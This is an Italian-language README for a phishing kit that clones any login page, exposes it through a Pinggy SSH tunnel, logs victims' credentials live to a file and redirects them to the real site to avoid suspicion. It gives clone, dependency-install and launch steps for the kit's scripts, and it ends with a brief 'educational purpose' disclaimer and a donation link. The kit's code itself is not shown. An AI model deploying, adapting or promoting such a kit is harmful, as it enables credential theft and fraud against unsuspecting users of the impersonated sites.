# 🎣 Phishing Kit Personalizzabile - Pinggy Tunnel

Phishing kit **plug-and-play** che clona **qualsiasi pagina login**, hosta con **Pinggy** (sempre online), cattura credenziali **live** + file, redirect realistico.

## ✨ **FEATURE**
- ✅ **Clona** HTML/CSS/JS/Immagini automaticamente
- ✅ **Fix** JS problematico + pulsanti submit
- ✅ **Pinggy tunnel** - SSH, zero install, sempre online
- ✅ **Universal fallback** se clonazione fallisce
- ✅ **Live logging** + `credentials.txt`
- ✅ **Zero sospetti** - redirect sito reale

## 📋 **REQUIREMENTS**

### Python 3.9+
```bash
/Library/Frameworks/Python.framework/Versions/3.9/bin/python3 --version
```
### **DIPENDENZE**
```
pip install flask requests beautifulsoup4 lxml
```

## SSH (già presente su Mac/Linux)
```
ssh -V
```

## 1. Clona struttura
```
git clone https://github.com/PipinoMat/CustomPhish.git
cd CustomPhish
mkdir -p templates static/{css,js,images}
```

## 2. Venv + deps
```
/Library/Frameworks/Python.framework/Versions/3.9/bin/python3 -m venv venv39
source venv39/bin/activate
pip install flask requests beautifulsoup4 lxml
```

## 3. Permessi script
```
chmod +x new_target.sh pinggy.sh
```

# 🎯 UTILIZZO

## NEW TARGET (1 TERMINALE - VENV)
```
./new_target.sh
python3.9 clone_phish.py
```

## AVVIO SERVER (2 TERMINALE - VENV)
```
python3.9 server.py
```
## AVVIO PINGGLY (3 TERMINALE)
```
./pinggly.sh
```

### ⚠️Use this program only for educational purpose, every abuse it's ILLEGAL!⚠️


<a href="https://buymeacoffee.com/pipinomat">
  <button>SUPPORT THIS PROJECT FOR FUTURE VERSIONS <3</button>
</a>

